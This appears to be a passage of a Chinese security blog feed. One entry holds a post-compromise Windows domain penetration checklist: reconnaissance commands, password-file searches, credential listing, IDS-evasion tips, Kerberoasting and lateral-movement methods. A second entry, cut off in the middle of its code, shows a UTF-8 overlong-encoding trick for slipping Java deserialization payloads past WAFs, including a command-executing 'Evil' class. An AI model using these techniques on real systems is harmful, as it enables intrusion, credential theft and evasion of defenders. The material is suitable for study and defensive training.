    <content type="html"><![CDATA[<p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a>   将Windows内网渗透总结的很好  可以好好学习一下</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。本节主要介绍当一台内网机器被攻破后，我们收集信息的一些手法。</p><p><strong>(一般来说存在在内网中的Windows机器才是会在域中)</strong></p><p><strong>(就是不能使用fscan的情况下   因为ids会检测流量)</strong></p><h2 id="先查看是否存在域中"><a href="#先查看是否存在域中" class="headerlink" title="先查看是否存在域中"></a>先查看是否存在域中</h2><p><code>systeminfo</code>命令就可以进行查看</p><p><img src="../images/image-20240520161537826.png" alt="image-20240520161537826"></p><h2 id="查看系统进程"><a href="#查看系统进程" class="headerlink" title="查看系统进程"></a>查看系统进程</h2><p>首先的话我们是建议先使用<code>tasklist</code>查看系统进程    看看有没有杀毒软件这些  然后就生成对应的免杀马上去  进行权限维持住</p><p><img src="../images/image-20240520161204994.png" alt="image-20240520161204994"></p><p>复制这些进程去杀软识别网站去进行查看 </p><p>判断是否出网  </p><p>然后根据杀软来使用特定的免杀来进行权限维持   然后搭建隧道</p><h2 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h2><p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p><p><code>setspn -T domain.com -Q */*</code></p><p><img src="../images/image-20240520161629285.png" alt="image-20240520161629285"></p><p>在上述截图中可以清晰的看到WIN2019机器上运行了dns服务。如果网内存在mssql，利用SPN扫描也可以得到相应的结果。  其实通过查看这个spn服务  看到了dns服务运行在win2019这台机器上 也能猜到了这个win2019的机器就是域控了  因为一般来说dns服务器是在域控上的</p><h2 id="端口连接"><a href="#端口连接" class="headerlink" title="端口连接"></a>端口连接</h2><p>利用netstat<br>-ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p><p><img src="../images/image-20240520162214680.png" alt="image-20240520162214680"></p><p>类似像这种  就能以此来获取相关的信息</p><h2 id="查看主机路由"><a href="#查看主机路由" class="headerlink" title="查看主机路由"></a>查看主机路由</h2><p><code>route print</code></p><p><img src="../images/image-20240523192833807.png" alt="image-20240523192833807"></p><p>在网络目标中就能看到主机的ip  并且也能知道该机器存在两个网卡 <strong>(ipconfig也能查看到)</strong></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，是一个不错的宝藏。</p><p>可以使用如下命令寻找包含密码字段的文件：</p><blockquote><p>cd /web findstr /s /m “password” <em>.</em></p></blockquote><p>下面是常用应用的默认配置路径：</p><p>a、</p><blockquote><p>Tomcat: CATALINA_HOME/conf/tomcat-users.xml</p></blockquote><p>b、</p><blockquote><p>Apache: /etc/httpd/conf/httpd.conf</p></blockquote><p>c、</p><blockquote><p>Nginx: /etc/nginx/nginx.conf</p></blockquote><p>d、</p><blockquote><p>Wdcp: /www/wdlinux/wdcp/conf/mrpw.conf</p></blockquote><p>e、</p><blockquote><p>Mysql: mysql\data\mysql\user.MYD</p></blockquote><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>可以在网内收集用户等信息，对高权限用户做针对性的攻击，包括定位到域控，对域控发起攻击。</p><ul><li>查看域用户</li></ul><p><code>net user /domain</code>   普通域用户就行</p><p><img src="../images/image-20240520164512685.png" alt="image-20240520164512685"></p><ul><li>查看域管理员</li></ul><p><code>net group “domain admins” /domain</code></p><p><img src="../images/image-20240520164618197.png" alt="image-20240520164618197"></p><p>其实域管的话一般都是Administrator  <strong>(也可能是有别的账户也是域管  后面被加进去的)</strong></p><ul><li><p>快速定位域控ip，一般是dns、时间服务器：</p><p>其实在上面的查看spn服务的时候就可以定位到域控了  因为就是可以看到域控对应的是dns服务</p><p><strong>直接ping域名和域控机器名字就行了  就能看到域控的ip地址了 </strong>  如果域控上有时间服务器的话 <code>net time /domain</code>也行</p><p><img src="../images/image-20240520164855192.png" alt="image-20240520164855192"></p></li></ul><ul><li>查看域控</li></ul><p><code>net group “domain controllers” /domain</code></p><p><img src="../images/image-20240520165057881.png" alt="image-20240520165057881"></p><ul><li>查看当前会话信息 <strong>(查看当前主机与所连接的客户端之间的会话)</strong></li></ul><p><img src="../images/image-20240523201649141.png" alt="image-20240523201649141"></p><ul><li>查看网络共享信息</li></ul><p><img src="../images/image-20240523201725297.png" alt="image-20240523201725297"></p><ul><li>查看已连接的网络共享</li></ul><p><img src="../images/image-20240523201822489.png" alt="image-20240523201822489"></p><ul><li>查看当前主机登录用户</li></ul><p><code>query user</code></p><p><img src="../images/image-20240523201907625.png" alt="image-20240523201907625"></p><ul><li>查看计划任务</li></ul><p><code>schtasks /query /v /fo list</code></p><p><img src="../images/image-20240523202541002.png" alt="image-20240523202541002"></p><h2 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h2><p>a、查看共享资料：</p><blockquote><p>net view</p></blockquote><p>b、查看arp表：</p><blockquote><p>arp -a</p></blockquote><p><img src="../images/image-20240520171052373.png" alt="image-20240520171052373"></p><p>这种接口的话就是本机的ip地址   然后动态的也是内网中的ip地址  就是域内机器的ip</p><p>c、查看hosts文件：</p><blockquote><p>linux: cat /etc/hosts</p><p>windows: type c:\Windows\system32\drivers\etc\hosts</p></blockquote><p>d、查看dns缓存：</p><blockquote><p>ipconfig /displaydns</p></blockquote><p><img src="../images/image-20240520165346867.png" alt="image-20240520165346867"></p><p>e、也可以利用一些工具 (知道怎么会对抗ids才能做)</p><p>不然一般的扫描工具应该一扫设备就会告警</p><p><strong>(使用icmp协议  netbios协议  arp协议  smb协议)</strong></p><p><strong>扫端口的话就指定端口来扫  不使用<code>1-65535</code>  这种大范围的端口来扫</strong>  </p><h2 id="会话收集"><a href="#会话收集" class="headerlink" title="会话收集"></a>会话收集</h2><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p><p>可以使用NetSessionEnum api来查看其他主机上有哪些用户登录。</p><p>api相关介绍如下：</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p><p>利用powershell脚本PowerView为例。</p><p><strong>(直接拿别人的图了)</strong></p><p>a、可以查看域用户登录过哪些机器:</p><p><img src="../images/d8f1c9331880363d2ffda1fdcee36889.png" alt="img"></p><p>b、也可以查看机器被哪些用户登陆过：</p><p><img src="../images/db429ae1e62d2614053b58b3d7eb5d0a.png" alt="img"></p><p>其他工具、api类似。当有了上述信息后，就可以对发现到的域管或者登录着域管的机器进行攻击，只要能拿下这些机器，就可以有相应的权限去登录域控。</p><p><strong>在这一步的话就可以进行尝试进行密码hash值得抓取了 </strong>  </p><h2 id="凭据收集"><a href="#凭据收集" class="headerlink" title="凭据收集"></a>凭据收集</h2><p><code>cmdkey /list</code></p><p><img src="../images/image-20240520174930475.png" alt="image-20240520174930475"></p><p>还有一些常用软件的注册表地址</p><p><img src="../images/image-20240520175657484.png" alt="image-20240520175657484"></p><p>还有Google浏览器记录</p><h2 id="域信任-等会细看一下"><a href="#域信任-等会细看一下" class="headerlink" title="域信任  (等会细看一下)"></a>域信任  (等会细看一下)</h2><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p><p>查看域信任：</p><blockquote><p>nltest /domain_trusts</p></blockquote><p><img src="../images/90ed017163e562eea05fe62d0834fcdf.png" alt="img"></p><p>上述结果显示child.jumbolab.com和jumbolab.com两个域是双向信任的。</p><h2 id="域传送-等会看一下"><a href="#域传送-等会看一下" class="headerlink" title="域传送(等会看一下)"></a>域传送(等会看一下)</h2><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p><p>windows：</p><blockquote><p>nslookup -type=ns domain.com nslookup sserver dns.domain.com ls domain.com</p></blockquote><p>linux：</p><blockquote><p>dig <a href="https://github.com/dns">@dns</a>.domain.com axfr domain.com</p></blockquote><h2 id="DNS记录获取"><a href="#DNS记录获取" class="headerlink" title="DNS记录获取"></a>DNS记录获取</h2><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p><p>a、在windows server上，可以使用Dnscmd工具获取dns记录。</p><p>获取dns记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscmd /ZonePrint vulntarget.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240520204915878.png" alt="image-20240520204915878"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd . /EnumRecords jumbolab.com .</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240520205010444.png" alt="image-20240520205010444"></p><p>b、在非windows server机器上，可以使用PowerView获取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module PowerView.ps1 Get-DNSRecord -ZoneName vulntarget.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240520205132756.png" alt="image-20240520205132756"></p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>就是说在进行tgt票据申请的时候  会进行预身份认证  如果验证通过才会返回tgt票据  但是如果关闭了 预身份认证的话  就会无条件返回tgt  <strong>(那么在这个时候  也会返回用户密码加密过的sessionkey)</strong>  </p><p>所以说我们就可以通过爆破这个session  然后获取到用户的密码</p><p><a href="https://ke1nys.github.io/posts/9fa2b7fe.html">https://ke1nys.github.io/posts/9fa2b7fe.html</a></p><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p><p><strong>这个收集域内的信息做成拓扑图确实很好用  但是容易产生告警</strong></p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="账号密码连接"><a href="#账号密码连接" class="headerlink" title="账号密码连接"></a>账号密码连接</h2><p>在上述流程中  如果我们对一台已经被入侵的域机器信息收集完成后  我们就可以收集到的信息  来攻击下一台机器</p><p>例如pth攻击</p><ul><li>impacket套件</li><li>Psexec</li><li>WMI</li></ul><p>等等方法都可以</p><h2 id="其他方法-后续补充一下"><a href="#其他方法-后续补充一下" class="headerlink" title="其他方法  (后续补充一下)"></a>其他方法  (后续补充一下)</h2><p>我觉得 如果尝试其他方法都行不通的时候  可以尝试看看能不能打 <strong>委派  nopac  证书模板  ntlm-relay攻击</strong>等漏洞 能直接打到域控的洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/154&quot;&gt;https://security.tencent.com/index.php/blog/msg/154&lt;/a&gt;   将Windows内网渗透总结的很好</summary>
      
    
    
    
    
    <category term="windows内网渗透" scheme="https://ke1nys.github.io/tags/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>UTF-8 Overlong-Encoding</title>
    <link href="https://ke1nys.github.io/posts/840eff0.html"/>
    <id>https://ke1nys.github.io/posts/840eff0.html</id>
    <published>2024-05-04T08:42:08.000Z</published>
    <updated>2024-06-05T07:35:10.104Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下这个知识点  可以用来绕过对java反序列化的检测的WAF</p><p>首先我们来看一下序列化后的数据是长什么样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240504164720416.png" alt="image-20240504164720416"></p><p>完全是可以明文可见的   我们来跟进加一下在反序列化的时候 readObject是如何读取到这个类名的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass#readNonProxy(ObjectInputStream in)</span><br><span class="line">-&gt; ObjectInputStream#readUTF()</span><br><span class="line">-&gt; BlockDataInputStream#readUTF()</span><br><span class="line">-&gt; ObjectInputStream#readUTFBody(long utflen)</span><br><span class="line">-&gt; ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240504165352996.png" alt="image-20240504165352996"></p><p>重点就是这个readUTFSpan函数了  utflen就是这个字符串的长度 读取之后传给sbuf然后返回</p><p><img src="../images/image-20240504165514822.png" alt="image-20240504165514822"></p><p>这里的话可以看出 默认序列化的字符串是一个字节的  然后我们往下看  发现还有2个byte和3个byte的转化  那么我们是不是可以将原本的一个byte转化成两个甚至三个byte？</p><p>接下来实验一下</p><p><img src="../images/image-20240504165754845.png" alt="image-20240504165754845"></p><p>参考这个表格来进行转化</p><p><img src="../images/image-20240504170309477.png" alt="image-20240504170309477"></p><p>这个是修改后的1.ser 因为字节长度多了一位  就在前面加一</p><p><img src="../images/image-20240504170439065.png" alt="image-20240504170439065"></p><p>依旧是可以进行序列化操作的</p><p><img src="../images/image-20240504171136164.png" alt="image-20240504171136164"></p><p><img src="../images/image-20240504171151965.png" alt="image-20240504171151965"></p><p>三字节同样可以</p><p>如果全部替换的话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;Character, <span class="type">int</span>[]&gt; map;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;;&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xbb</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;$&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;[&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;]&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;c&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;d&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;f&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;g&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;h&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;j&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaa</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;k&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xab</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;l&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xac</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;m&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xad</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;n&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaf</span>&#125;); <span class="comment">// 0x6f</span></span><br><span class="line">        map.put(<span class="string">&#x27;p&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb0</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;r&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;t&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;w&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;x&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xba</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;A&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x81</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;B&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x82</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;C&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x83</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;D&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x84</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;E&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x85</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;F&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x86</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;G&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x87</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;H&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x88</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;I&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x89</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;J&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8a</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;K&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;L&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8c</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;M&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;N&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8e</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;O&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x8f</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;P&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x90</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;Q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x91</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;R&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x92</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;S&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x93</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;T&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x94</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;U&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x95</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x96</span>&#125;);</span><br><span class="line">        map.put(<span 